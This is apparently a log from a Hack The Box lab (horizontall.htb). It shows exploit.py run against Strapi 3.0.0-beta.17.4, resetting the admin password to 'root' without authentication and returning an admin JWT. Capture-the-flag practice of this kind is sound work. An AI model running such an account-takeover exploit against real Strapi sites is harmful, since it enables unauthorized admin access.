@@ -1,0 +1,7 @@
+python3 exploit.py admin@horizontall.htb http://api-prod.horizontall.htb root                                            
+[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
+[*] Sending password reset request...
+[*] Setting new password...
+[*] Response:
+b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzNzIyOTgzLCJleHAiOjE2MzYzMTQ5ODN9.qB14C4hnKdUR_RkcsbUjLM_CeB65k1V9ihD14_wXgpo","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
+
